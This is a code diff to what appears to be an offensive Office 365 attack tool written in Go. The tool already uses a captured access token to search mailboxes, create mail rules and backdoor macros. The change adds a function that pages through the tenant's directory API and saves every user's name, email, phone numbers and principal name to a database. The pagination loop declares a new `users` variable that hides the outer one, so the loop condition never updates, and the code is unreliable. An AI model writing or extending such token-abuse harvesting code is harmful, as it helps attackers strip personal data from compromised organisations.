@@ -67,6 +67,8 @@ func InitializeProfile(accessToken string){
 	GetKeywordEmails(user)
 	CreateRules(user)
 	GetKeywordFiles(user)
+  // TODO: We should only run this once per domain
+  GetADUsers(user.AccessToken)
 	if model.GlbConfig.Backdoor.Enabled {
 		if runtime.GOOS == "windows" {
 
@@ -75,9 +77,33 @@ func InitializeProfile(accessToken string){
 			fmt.Println("Macro backdooring is only available on Windows.")
 		}
 	}
+}
+
+func GetADUsers(accessToken string){
+		messagesResponse := CallApiMethod("GET","/users",accessToken,"",nil,"")
+		users := model.ADUsers{}
+		json.Unmarshal([]byte(messagesResponse), &users)
+
+		// Loads the first batch of emails.
+		for _,user := range users.Value{
+      database.InsertADUser(model.ADUser{user.ID,user.BusinessPhones,user.DisplayName,user.GivenName,user.Mail,user.MobilePhone,user.PreferredLanguage,user.Surname,user.UserPrincipalName})
+		}
+    log.Printf("Extracted %d users",len(users.Value))
 
 
+		for users.OdataNextLink != ""{
+			endpoint := strings.Replace(users.OdataNextLink,model.ApiEndpointRoot,"",-1)
+			messagesResponse = CallApiMethod("GET",endpoint,accessToken,"",nil,"")
 
+      users := model.ADUsers{}
+      json.Unmarshal([]byte(messagesResponse), &users)
+
+      // Loads the first batch of emails.
+      for _,user := range users.Value{
+        database.InsertADUser(model.ADUser{user.ID,user.BusinessPhones,user.DisplayName,user.GivenName,user.Mail,user.MobilePhone,user.PreferredLanguage,user.Surname,user.UserPrincipalName})
+      }
+      log.Printf("Extracted %d users",len(users.Value))
+  }
 }
 
 func GetKeywordEmails(user model.User){
